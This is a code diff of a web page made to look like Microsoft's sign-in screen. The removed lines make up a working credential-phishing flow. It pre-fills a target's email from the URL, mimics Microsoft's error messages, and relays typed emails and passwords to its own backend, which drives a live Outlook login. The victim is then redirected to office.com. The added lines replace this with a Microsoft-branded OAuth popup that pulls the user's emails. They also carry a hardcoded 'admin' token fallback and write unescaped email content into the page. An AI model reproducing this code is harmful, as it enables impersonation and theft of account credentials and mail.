@@ -482,7 +482,7 @@
             
 
             <div class="header">
-                <h1 id="headerTitle">Sign in</h1>
+                <h1 id="headerTitle">Sign in to Microsoft</h1>
             </div>
 
             <!-- Status and messages hidden -->
@@ -513,41 +513,45 @@
                 <button type="button" class="cancel-btn" onclick="cancelLoading()">Cancel</button>
             </div>
 
-            <!-- Email form - Initially hidden until backend is ready -->
-            <div id="emailForm" style="display: none;">
-                <form onsubmit="startLogin(event)">
-                    <div class="form-group">
-                        <input type="email" id="email" class="microsoft-input" placeholder="Email, phone, or Skype" required>
-                    </div>
+            <!-- Microsoft OAuth Login form -->
+            <div id="oauthForm" style="display: none;">
+                <div class="form-group">
+                    <p style="color: #323130; font-size: 14px; margin-bottom: 20px;">
+                        Click the button below to sign in with your Microsoft account using secure OAuth authentication.
+                    </p>
+                </div>
 
-                    <div class="form-links">
-                        <span class="create-account">No account? <a href="#" onclick="return false;">Create one!</a></span><br><br>
-                        <a href="#" onclick="return false;">Can't access your account?</a>
-                    </div>
+                <div class="button-group">
+                    <button type="button" class="btn btn-primary" id="oauthBtn" onclick="startOAuthLogin()" style="width: 100%;">
+                        Sign in with Microsoft
+                    </button>
+                </div>
 
-                    <div class="button-group">
-                        <button type="button" class="btn btn-secondary" onclick="goBack()">Back</button>
-                        <button type="submit" class="btn btn-primary" id="nextBtn">Next</button>
-                    </div>
-                </form>
+                <div class="form-links" style="margin-top: 20px;">
+                    <span class="create-account">No account? <a href="https://account.microsoft.com/account" target="_blank">Create one!</a></span><br><br>
+                    <a href="https://account.live.com/ResetPassword.aspx" target="_blank">Can't access your account?</a>
+                </div>
             </div>
 
-            <!-- Password form -->
-            <div id="passwordForm" class="password-section">
-                <form onsubmit="continueLogin(event)">
-                    <div class="form-group">
-                        <input type="password" id="password" class="microsoft-input" placeholder="Password" required>
-                    </div>
-
-                    <div class="form-links">
-                        <a href="#" onclick="return false;">Forgot my password</a>
-                    </div>
-
+            <!-- Success form - shown after authentication -->
+            <div id="successForm" class="password-section">
+                <div style="text-align: center; padding: 20px 0;">
+                    <div style="font-size: 48px; color: #107c10; margin-bottom: 15px;">✅</div>
+                    <h2 style="color: #107c10; margin-bottom: 10px;">Successfully signed in!</h2>
+                    <p id="userEmail" style="color: #323130; font-size: 14px; margin-bottom: 20px;"></p>
+                    
                     <div class="button-group">
-                        <button type="button" class="btn btn-secondary" onclick="goBackToEmail()">Back</button>
-                        <button type="submit" class="btn btn-primary" id="signInBtn">Sign in</button>
+                        <button type="button" class="btn btn-primary" onclick="viewEmails()" style="width: 100%;">
+                            View My Emails
+                        </button>
                     </div>
-                </form>
+                    
+                    <div style="margin-top: 15px;">
+                        <button type="button" class="btn btn-secondary" onclick="logout()" style="width: 100%;">
+                            Sign Out
+                        </button>
+                    </div>
+                </div>
             </div>
 
 
@@ -565,65 +569,23 @@
 
     <script>
         let currentSessionId = null;
-        let currentStep = 'email'; // 'email' or 'password'
+        let currentStep = 'oauth'; // 'oauth', 'success'
         const API_BASE = '';
-        let preloadInProgress = false; // Prevent concurrent preload requests
+        let authWindow = null;
 
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
-            // Check for email parameter in URL
-            const urlParams = new URLSearchParams(window.location.search);
-            const emailParam = urlParams.get('email');
+            setLoading(true, 'Initializing Microsoft Graph API', false);
             
-            if (emailParam) {
-                console.log('Email parameter detected:', emailParam);
-                // Pre-fill email and auto-submit after backend is ready
-                document.getElementById('email').value = emailParam;
-                
-                // Start with loading dots and auto-submit when ready
-                setLoading(true, 'Trying to sign you in', false);
-                
-                checkBackendHealth();
-                checkSessionStatus();
-                preloadOutlook().then(() => {
-                    // Auto-submit the email after preload is complete
-                    setTimeout(() => {
-                        if (document.getElementById('emailForm').style.display !== 'none') {
-                            console.log('Auto-submitting email:', emailParam);
-                            startLogin({ preventDefault: () => {} }); // Auto-submit
-                        }
-                    }, 500);
-                });
-            } else {
-                // Normal initialization without auto-submit
-                setLoading(true, 'Trying to sign you in', false);
-                
-                checkBackendHealth();
-                checkSessionStatus();
-                preloadOutlook();
-            }
+            checkBackendHealth();
+            checkExistingSession();
         });
 
         // Utility functions
         function showMessage(message, type = 'info') {
             const messageArea = document.getElementById('messageArea');
             messageArea.style.display = 'block';
-
-            // Check if this is a Microsoft-specific error message
-            if (type === 'error' && (
-                message.includes("We couldn't find an account") ||
-                message.includes("That username is incorrect") ||
-                message.includes("get a new Microsoft account")
-            )) {
-                // Format Microsoft error with proper styling and link
-                let formattedMessage = message.replace(
-                    'get a new Microsoft account',
-                    '<a href="#" onclick="return false;">get a new Microsoft account</a>'
-                );
-                messageArea.innerHTML = `<div class="message microsoft-error">${formattedMessage}</div>`;
-            } else {
-                messageArea.innerHTML = `<div class="message ${type}">${message}</div>`;
-            }
+            messageArea.innerHTML = `<div class="message ${type}">${message}</div>`;
         }
 
         function clearMessage() {
@@ -637,8 +599,8 @@
             const microsoftDotsLoader = document.getElementById('microsoftDotsLoader');
             const microsoftLogo = document.querySelector('.microsoft-logo');
             const container = document.querySelector('.container');
-            const emailForm = document.getElementById('emailForm');
-            const passwordForm = document.getElementById('passwordForm');
+            const oauthForm = document.getElementById('oauthForm');
+            const successForm = document.getElementById('successForm');
             const headerTitle = document.getElementById('headerTitle');
             const loadingCancelContainer = document.getElementById('loadingCancelContainer');
 
@@ -663,8 +625,8 @@
                 loadingCancelContainer.classList.add('show');
 
                 // Hide forms during loading
-                emailForm.style.display = 'none';
-                passwordForm.style.display = 'none';
+                oauthForm.style.display = 'none';
+                successForm.style.display = 'none';
             } else {
                 // Hide all loading animations
                 loadingAnimation.classList.remove('active');
@@ -681,14 +643,14 @@
                 microsoftLogo.style.visibility = 'visible';
 
                 // Restore header text based on current step
-                if (currentStep === 'email') {
-                    headerTitle.textContent = 'Sign in';
-                    emailForm.style.display = 'block';
-                    passwordForm.style.display = 'none';
-                } else if (currentStep === 'password') {
-                    headerTitle.textContent = 'Enter password';
-                    emailForm.style.display = 'none';
-                    passwordForm.style.display = 'block';
+                if (currentStep === 'oauth') {
+                    headerTitle.textContent = 'Sign in to Microsoft';
+                    oauthForm.style.display = 'block';
+                    successForm.style.display = 'none';
+                } else if (currentStep === 'success') {
+                    headerTitle.textContent = 'Welcome';
+                    oauthForm.style.display = 'none';
+                    successForm.style.display = 'block';
                 }
 
                 // Restore other elements visibility
@@ -704,76 +666,26 @@
             inputs.forEach(input => input.disabled = loading);
         }
 
-        function showPasswordForm(email) {
-            currentStep = 'password';
-            document.getElementById('emailForm').style.display = 'none';
-            document.getElementById('passwordForm').className = 'password-section visible';
-            document.getElementById('headerTitle').textContent = 'Enter password';
-            document.getElementById('backInfo').className = 'back-info visible';
-            document.getElementById('enteredEmail').textContent = email;
-
-            // Focus on password field
-            setTimeout(() => {
-                document.getElementById('password').focus();
-            }, 100);
-        }
-
-        function showEmailForm() {
-            currentStep = 'email';
-            document.getElementById('emailForm').style.display = 'block';
-            document.getElementById('passwordForm').className = 'password-section';
-            document.getElementById('headerTitle').textContent = 'Sign in';
-            document.getElementById('backInfo').className = 'back-info';
-        }
-
-
-
-        function goBack() {
-            // Placeholder for back functionality
-            return false;
-        }
-
         function cancelLoading() {
             // Cancel loading and return to the current form
             setLoading(false);
             clearMessage();
-
-            // If we're in password step, go back to email
-            if (currentStep === 'password') {
-                goBackToEmail();
-            } else {
-                // Otherwise just clear the email field and show the form
-                document.getElementById('email').value = '';
-                showEmailForm();
-            }
+            showOAuthForm();
         }
 
-        async function goBackToEmail() {
-            // Call backend to reload Outlook page
-            try {
-                const response = await fetch(`${API_BASE}/api/back`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' }
-                });
+        function showOAuthForm() {
+            currentStep = 'oauth';
+            document.getElementById('oauthForm').style.display = 'block';
+            document.getElementById('successForm').style.display = 'none';
+            document.getElementById('headerTitle').textContent = 'Sign in to Microsoft';
+        }
 
-                if (response.ok) {
-                    const data = await response.json();
-                    console.log('Backend reloaded successfully:', data.message);
-                } else {
-                    console.error('Failed to reload backend page');
-                }
-            } catch (error) {
-                // Silent error handling
-            }
-
-            showEmailForm();
-            // Properly hide the password form
-            document.getElementById('passwordForm').style.display = 'none';
-            document.getElementById('passwordForm').className = 'password-section';
-            // Clear the password field
-            document.getElementById('password').value = '';
-            // Clear any messages
-            clearMessage();
+        function showSuccessForm(userEmail) {
+            currentStep = 'success';
+            document.getElementById('oauthForm').style.display = 'none';
+            document.getElementById('successForm').style.display = 'block';
+            document.getElementById('headerTitle').textContent = 'Welcome';
+            document.getElementById('userEmail').textContent = userEmail;
         }
 
         // API Functions
@@ -782,315 +694,184 @@
                 const response = await fetch(`${API_BASE}/api/health`);
                 const data = await response.json();
 
-                if (response.ok) {
-                    document.getElementById('statusIndicator').className = 'status-indicator online';
-                    document.getElementById('statusText').textContent = 'Backend online - Ready';
+                if (response.ok && data.authConfigured) {
+                    console.log('✅ Backend healthy and Azure configured');
+                    setLoading(false);
+                    showOAuthForm();
                 } else {
-                    throw new Error('Backend health check failed');
+                    throw new Error('Azure credentials not configured');
                 }
             } catch (error) {
-                document.getElementById('statusIndicator').className = 'status-indicator offline';
-                document.getElementById('statusText').textContent = 'Backend offline';
-                // Removed generic error message
-            }
-        }
-
-        async function preloadOutlook(retryAttempt = 1, maxRetries = 5) {
-            // Prevent concurrent preload requests
-            if (preloadInProgress) {
-                console.log('Preload already in progress, skipping...');
-                return Promise.resolve();
-            }
-
-            preloadInProgress = true;
-
-            try {
-                // Update status message with retry attempt (visible in loading dots)
-                if (retryAttempt === 1) {
-                    document.getElementById('statusText').textContent = 'Pre-loading Outlook page...';
-                    document.getElementById('headerTitle').textContent = 'Trying to sign you in...';
-                } else {
-                    document.getElementById('statusText').textContent = `Trying to sign you in (attempt ${retryAttempt}/${maxRetries})...`;
-                    document.getElementById('headerTitle').textContent = `Trying to sign you in (attempt ${retryAttempt}/${maxRetries})...`;
-                }
-
-                // Increase timeout for retries
-                const timeoutMs = Math.min(30000 + (retryAttempt - 1) * 10000, 60000); // 30s, 40s, 50s, 60s, 60s
-
-                // Create AbortController for better browser compatibility
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
-
-                const response = await fetch(`${API_BASE}/api/preload`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    signal: controller.signal
-                });
-
-                clearTimeout(timeoutId);
-                const data = await response.json();
-
-                if (response.ok) {
-                    if (data.status === 'preloaded' || data.status === 'already-loaded') {
-                        document.getElementById('statusText').textContent = 'Outlook page ready - Enter email';
-                        
-                        // Store session ID if provided
-                        if (data.sessionId) {
-                            currentSessionId = data.sessionId;
-                        }
-                        
-                        // Backend is now ready to ask for email - show the email form
-                        preloadInProgress = false; // Clear lock on success
-                        setLoading(false);
-                        document.getElementById('emailForm').style.display = 'block';
-                        document.getElementById('headerTitle').textContent = 'Sign in';
-                        
-                        // Focus on email field
-                        setTimeout(() => {
-                            document.getElementById('email').focus();
-                        }, 100);
-                        return Promise.resolve(); // Success - exit function
-                    } else {
-                        // Handle non-terminal statuses (loading, busy, etc.) - treat as transient and retry
-                        throw new Error(`Transient status: ${data.status || 'unknown'}`);
-                    }
-                } else {
-                    throw new Error(data.error || 'Failed to preload');
-                }
-            } catch (error) {
-                clearTimeout(timeoutId); // Clean up timeout on error
-                console.error(`Preload attempt ${retryAttempt} failed:`, error);
-                
-                // If we still have retries left, wait and retry
-                if (retryAttempt < maxRetries) {
-                    // Exponential backoff: 2s, 4s, 8s, 16s
-                    const delayMs = Math.min(2000 * Math.pow(2, retryAttempt - 1), 16000);
-                    
-                    return new Promise((resolve) => {
-                        setTimeout(async () => {
-                            // Reset the flag before retrying
-                            preloadInProgress = false;
-                            await preloadOutlook(retryAttempt + 1, maxRetries);
-                            resolve();
-                        }, delayMs);
-                    });
-                }
-                
-                // All retries exhausted - show error
-                preloadInProgress = false; // Clear lock on final failure
-                document.getElementById('statusText').textContent = 'Backend error - Manual loading available';
-                console.error('All preload attempts failed:', error);
-                
-                // Show error message and allow manual retry  
+                console.error('Backend health check failed:', error);
                 setLoading(false);
-                showMessage('Unable to prepare login page after multiple attempts. Please try refreshing the page.', 'error');
-                
-                // Show email form as fallback
-                document.getElementById('emailForm').style.display = 'block';
-                document.getElementById('headerTitle').textContent = 'Sign in';
+                showMessage('Backend error: Azure credentials not configured. Please check AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, and AZURE_TENANT_ID.', 'error');
+                showOAuthForm();
             }
         }
 
-        async function checkSessionStatus() {
+        async function checkExistingSession() {
             try {
                 const response = await fetch(`${API_BASE}/api/status`);
                 const data = await response.json();
 
-                if (data.hasActiveSession) {
+                if (data.authenticated && data.userEmail) {
                     currentSessionId = data.sessionId;
-                    // Don't show session actions automatically - keep the login form visible
-                    console.log('Found existing session:', currentSessionId);
+                    setLoading(false);
+                    showSuccessForm(data.userEmail);
+                    console.log('Found existing authenticated session:', data.userEmail);
+                } else {
+                    setLoading(false);
+                    showOAuthForm();
                 }
             } catch (error) {
                 console.error('Error checking session status:', error);
+                setLoading(false);
+                showOAuthForm();
             }
         }
 
-        async function startLogin(event) {
-            event.preventDefault();
-
-            const email = document.getElementById('email').value;
-
+        async function startOAuthLogin() {
             clearMessage();
-            setLoading(true, 'Taking you to your organization\'s sign-in page', false);
+            setLoading(true, 'Generating secure authentication link', false);
 
             try {
-                const response = await fetch(`${API_BASE}/api/login`, {
+                const response = await fetch(`${API_BASE}/api/auth-url`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, password: '' })
+                    headers: { 'Content-Type': 'application/json' }
                 });
 
                 const data = await response.json();
 
                 if (response.ok) {
                     currentSessionId = data.sessionId;
-
-                    if (data.loginComplete) {
-                        if (data.loginSuccess) {
-                            // Check if we need to redirect to office.com
-                            if (data.authMethod === 'cookies' || data.alreadyLoggedIn) {
-                                showMessage('✅ Login successful - redirecting to office.com...');
-                                window.location.href = 'https://office.com';
+                    
+                    // Open OAuth URL in new window
+                    authWindow = window.open(data.authUrl, 'microsoftAuth', 'width=600,height=700,scrollbars=yes,resizable=yes');
+                    
+                    setLoading(true, 'Waiting for Microsoft authentication...', false);
+                    
+                    // Poll for authentication completion
+                    const pollInterval = setInterval(async () => {
+                        try {
+                            // Check if window is closed
+                            if (authWindow.closed) {
+                                clearInterval(pollInterval);
+                                setLoading(false);
+                                showMessage('Authentication cancelled. Please try again.', 'error');
                                 return;
-                            } else {
-                                showMessage('✅ Login completed successfully!');
-                                // Close session after successful login
-                                fetch(`${API_BASE}/api/session`, {
-                                    method: 'DELETE',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({ sessionId: currentSessionId })
-                                });
-                                currentSessionId = null;
                             }
-                        } else {
-                            showMessage('Your account or password is incorrect. If you don\'t remember your password, <a href="#" onclick="return false;" style="color: #0067b8; text-decoration: underline;">reset it now</a>.', 'error');
-                        }
-                    } else {
-                        // Show site report if available
-                        if (data.siteReport) {
-                            // Check for error messages first - if there are errors, only show the error
-                            if (data.siteReport.errorMessages.length > 0) {
-                                // Get the first error message and format it like Microsoft does
-                                const firstError = data.siteReport.errorMessages[0];
-                                const formattedError = firstError.replace(
-                                    'get a new Microsoft account',
-                                    '<a href="#" onclick="return false;" style="color: #0067b8; text-decoration: none;">get a new Microsoft account</a>'
-                                );
 
-                                // Only show the Microsoft error message, nothing else
-                                showMessage(formattedError, 'error');
-                            } else if (data.siteReport.accountExists && data.siteReport.needsPassword) {
-                                // Account found, show password form without any
-                                showPasswordForm(email);
-                            } else if (!data.siteReport.accountExists) {
-                                // Account not found - show the Microsoft error message
-                                showMessage("We couldn't find an account with that username. Try another, or <a href='#' onclick='return false;' style='color: #0067b8; text-decoration: none;'>get a new Microsoft account</a>.", 'error');
-                            } else {
-                                // Other cases - proceed to password
-                                showPasswordForm(email);
+                            // Check backend for authentication status
+                            const statusResponse = await fetch(`${API_BASE}/api/status?sessionId=${currentSessionId}`);
+                            const statusData = await statusResponse.json();
+
+                            if (statusData.authenticated) {
+                                clearInterval(pollInterval);
+                                authWindow.close();
+                                setLoading(false);
+                                showSuccessForm(statusData.userEmail);
+                                showMessage('✅ Successfully authenticated with Microsoft!', 'success');
                             }
-                        } else {
-                            showPasswordForm(email);
+                        } catch (error) {
+                            // Continue polling
                         }
-                    }
+                    }, 2000); // Check every 2 seconds
+
+                    // Timeout after 5 minutes
+                    setTimeout(() => {
+                        if (authWindow && !authWindow.closed) {
+                            authWindow.close();
+                        }
+                        clearInterval(pollInterval);
+                        setLoading(false);
+                        showMessage('Authentication timeout. Please try again.', 'error');
+                    }, 300000);
 
                 } else {
-                    throw new Error(data.error || 'Login failed');
+                    throw new Error(data.error || 'Failed to generate auth URL');
                 }
 
             } catch (error) {
-                // Silent error handling
-            } finally {
+                console.error('OAuth login error:', error);
                 setLoading(false);
+                showMessage(`Authentication error: ${error.message}`, 'error');
             }
         }
 
-        async function continueLogin(event) {
-            event.preventDefault();
-
-            const password = document.getElementById('password').value;
-
-            if (!password) {
-                showMessage('Please enter your password', 'error');
-                return;
-            }
-
+        async function viewEmails() {
             clearMessage();
-            setLoading(true, 'Trying to sign you in', false);
+            setLoading(true, 'Loading your emails...', false);
 
             try {
-                const response = await fetch(`${API_BASE}/api/continue-login`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        password: password,
-                        sessionId: currentSessionId 
-                    })
-                });
-
+                const response = await fetch(`${API_BASE}/api/emails?sessionId=${currentSessionId}&count=10`);
                 const data = await response.json();
 
                 if (response.ok) {
-                    if (data.loginSuccess) {
-                        // Redirect to office.com after successful login
-                        console.log('✅ Login successful - redirecting to office.com...');
-                        window.location.href = 'https://office.com';
-                        return;
-                    } else {
-                        showMessage('Your account or password is incorrect. If you don\'t remember your password, <a href="#" onclick="return false;" style="color: #0067b8; text-decoration: underline;">reset it now</a>.', 'error');
-                    }
+                    setLoading(false);
+                    
+                    // Create a simple email viewer
+                    const emailList = data.emails.map(email => 
+                        `<div style="border-bottom: 1px solid #e1e1e1; padding: 10px 0;">
+                            <strong>${email.subject}</strong><br>
+                            <small style="color: #666;">From: ${email.from.emailAddress.name || email.from.emailAddress.address}</small><br>
+                            <small style="color: #666;">Date: ${new Date(email.receivedDateTime).toLocaleDateString()}</small><br>
+                            <p style="margin: 5px 0; color: #323130;">${email.bodyPreview}</p>
+                        </div>`
+                    ).join('');
 
-                    // Clear password field
-                    document.getElementById('password').value = '';
+                    // Show emails in a new window or alert
+                    const emailWindow = window.open('', 'emails', 'width=800,height=600,scrollbars=yes,resizable=yes');
+                    emailWindow.document.write(`
+                        <html>
+                            <head><title>Your Recent Emails</title></head>
+                            <body style="font-family: Segoe UI, sans-serif; padding: 20px;">
+                                <h2>Your Recent Emails (${data.count} items)</h2>
+                                ${emailList}
+                                <br><button onclick="window.close()">Close</button>
+                            </body>
+                        </html>
+                    `);
+
+                    showMessage(`✅ Loaded ${data.count} emails successfully!`, 'success');
 
                 } else {
-                    throw new Error(data.error || 'Continue login failed');
+                    throw new Error(data.error || 'Failed to load emails');
                 }
 
             } catch (error) {
-                // Silent error handling
-            } finally {
+                console.error('Error loading emails:', error);
                 setLoading(false);
+                showMessage(`Error loading emails: ${error.message}`, 'error');
             }
         }
 
-        // Helper function to simulate loading and then hiding it
-        function showLoading(message) {
-            const loadingIndicator = document.getElementById('loadingIndicator');
-            const loadingText = document.getElementById('loadingText');
-            loadingText.textContent = message;
-            loadingIndicator.style.display = 'block';
-            setLoading(true); // Disable inputs and buttons
-        }
-
-        function hideLoading() {
-            const loadingIndicator = document.getElementById('loadingIndicator');
-            loadingIndicator.style.display = 'none';
-            setLoading(false); // Enable inputs and buttons
-        }
-
-        // Helper functions for specific loading states
-        function showAccountCheckLoading() {
-            setLoading(true, 'Trying to sign you in...', false);
-        }
-
-        function showSignInLoading() {
-            setLoading(true, 'Trying to sign you in', true);
-        }
-
-        function showRedirectLoading() {
-            setLoading(true, 'Redirecting to Outlook...', true);
-        }
-
-        function hideAllLoading() {
-            setLoading(false);
-        }
-
-
-
-
-        // Function to reset the form to the email input stage
-        function resetToEmailForm() {
-            currentStep = 'email';
-
-            // Reset form
-            document.getElementById('email').value = '';
-            document.getElementById('password').value = '';
-
-            // Show email form, hide password form
-            document.getElementById('emailForm').style.display = 'block';
-            document.getElementById('passwordForm').style.display = 'none';
-
-            // Update header and back button
-            document.getElementById('headerTitle').textContent = 'Sign in';
-            document.getElementById('backInfo').className = 'back-info';
-
-            // Clear messages
+        async function logout() {
             clearMessage();
+            setLoading(true, 'Signing out...', false);
 
-            // Preload a fresh session with delay to avoid race conditions
-            setTimeout(() => preloadOutlook(), 1000);
+            try {
+                if (currentSessionId) {
+                    await fetch(`${API_BASE}/api/admin/session/${currentSessionId}`, {
+                        method: 'DELETE',
+                        headers: { 
+                            'Authorization': `Bearer ${global.adminToken || 'admin'}`,
+                            'Content-Type': 'application/json' 
+                        }
+                    });
+                }
+
+                currentSessionId = null;
+                setLoading(false);
+                showOAuthForm();
+                showMessage('✅ Signed out successfully!', 'success');
+
+            } catch (error) {
+                console.error('Logout error:', error);
+                currentSessionId = null;
+                setLoading(false);
+                showOAuthForm();
+                showMessage('Signed out (with errors)', 'info');
+            }
         }
 
 
